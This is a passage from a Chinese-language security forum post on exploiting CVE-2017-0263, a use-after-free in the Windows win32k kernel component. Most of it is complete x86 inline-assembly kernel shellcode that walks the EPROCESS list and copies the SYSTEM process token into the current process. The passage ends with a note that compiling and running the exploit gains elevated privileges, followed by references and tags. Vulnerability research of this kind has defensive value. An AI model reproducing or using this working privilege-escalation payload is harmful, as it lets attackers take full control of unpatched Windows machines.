
```
DWORD __declspec(naked) ShellCode_CVE_2017_0263(HWND hWnd, int code, WPARAM wParam, LPARAM lParam)

{

	__asm

	{

		push ebp

		mov ebp, esp



		// 如果消息不是0x9F9F，函数退出

		mov eax, dword ptr[ebp + 0xC]

		cmp eax, 0x9F9F

		jne LocFAILED



		// 如果cs的值为0x1B则是用户模式(这里判断低2位是否为0就可以)，函数退出

		mov ax, cs

		cmp ax, 0x1B

		je LocFAILED



		// 将bDialogWindow标志位自增

		cld

		// ecx = tagWND

		mov ecx, dword ptr [ebp + 8]

		inc dword ptr [ecx + 0x16]



		pushad

		// 通过当前EIP首地址获取SHELLCODE对象的首地址

		call $5

	$5:

		pop edx

		sub edx, 0x443

		

		//  将tagCLS数组与参数wParam的tagPOPUPMENU对比

		mov ebx, 0x100

		// esi = SHELLCODE->tagCLS

		lea esi, [edx + 0x18]

		// edi = tagPOPUPMENU

		mov edi, dword ptr[ebp + 0x10]



	LocForCLS:

		test ebx, ebx

		je LocGetEPROCESS

		// 获取tagCLS中非0的数值

		lods dword ptr [esi]

		dec ebx

		cmp eax, 0

		je LocForCLS

		// 获取tagCLS->lpszMenuName

		add eax, dword ptr [edx + 8]

		// 比较是否是符合条件的tagCLS

		cmp dword ptr [eax], edi

		jne LocForCLS

		// 不符合则清空

		and dword ptr [eax], 0

		jmp LocForCLS



	LocGetEPROCESS:

		// ecx = tagWND->pti

		mov ecx, dword ptr [ecx + 8]

		// ebx = SHELLCODE->off_THREADINFO_ppi

		mov ebx, dword ptr [edx + 0x0C]

		// ecx = tagTHREADINFO->ppi

		mov ecx, dword ptr [ebx + ecx]

		// ecx = tagPROCESSINFO->EPROCESS

		mov ecx, dword ptr [ecx]

		// ebx = SHELLCODE->off_EPROCESS_ActiveLink

		mov ebx, dword ptr [edx + 0x10]

		// eax = SHELLCODE->pid

		mov eax, dword ptr [edx + 4]



		push ecx

	LocForCurrentPROCESS :

		// 判断PID是否是当前进程PID

		cmp dword ptr [ebx + ecx - 4], eax

		je LocFoundCURRENT

		// 取下一进程EPROCESS

		mov ecx, dword ptr [ebx + ecx]

		sub ecx, ebx

		jmp LocForCurrentPROCESS

		

	LocFoundCURRENT:

		// 将找到的EPROCESS赋给edi

		mov  edi, ecx

		pop  ecx



	LocForSystemPROCESS:

		// 判断EPROCESS的PID是否为4

		cmp dword ptr [ebx + ecx - 4], 4

		je LocFoundSYSTEM

		// 取下一进程EPROCESS

		mov ecx, dword ptr [ebx + ecx]

		sub ecx, ebx

		jmp LocForSystemPROCESS



	LocFoundSYSTEM:

		// 将SYSTEM进程EPROCESS赋给esi

		mov esi, ecx



		// eax=SHELLCODE->off_EPROCESS_Token

		mov eax, dword ptr [edx + 0x14]

		// 当前进程和系统进程EPROCESS指向TOKEN

		add esi, eax

		add edi, eax

		// 将系统进程TOKEN赋值给当前进程的TOKEN

		lods dword ptr[esi]

		stos dword ptr es:[edi]



		// 将系统进程TOKEN对象的PointerCount + 2，即增加引用计数

		and eax, 0x0FFFFFFF8

		add dword ptr[eax - 0x18], 2



		popad

		// 提权成功，返回值设为0x9F9F

		mov eax, 0x9F9F

		jmp LocRETURN



	LocFAILED:

		// 提权失败，返回值设为1

		mov eax, 1

	LocRETURN:

		leave

		ret 0x10

	}

}
```

# 四.运行结果

最后还有一个坑，这个漏洞要通过创建新线程来提权，否则主线程会直接卡死，完整代码在[**c4eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5%4i4K6u0V1x3o6t1$3x3#2)9J5k6h3y4H3M7l9`.`.**](https://bbs.kanxue.com/elink@632K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5%4i4K6u0V1x3o6t1$3x3#2)9J5k6h3y4H3M7l9`.`.)。编译运行`exp`，最终就会成功提权：

![](https://bbs.kanxue.com/upload/attach/202206/QAGCKCW36Y6ZRWR.jpg)

# 五.参考资料

- [**0f8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5H3x3U0x3%4y4H3`.`.**](https://bbs.kanxue.com/elink@b06K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5H3x3U0x3%4y4H3`.`.)
- [**e8aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5H3x3U0x3%4z5l9`.`.**](https://bbs.kanxue.com/elink@3b0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5H3x3U0x3%4z5l9`.`.)
- [**4b1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5&6x3U0R3%4**](https://bbs.kanxue.com/elink@1c9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5&6x3U0R3%4)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-8-4 23:15 被1900编辑，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)
[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)
[#UAF](https://bbs.kanxue.com/forum-150-1-158.htm)
[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
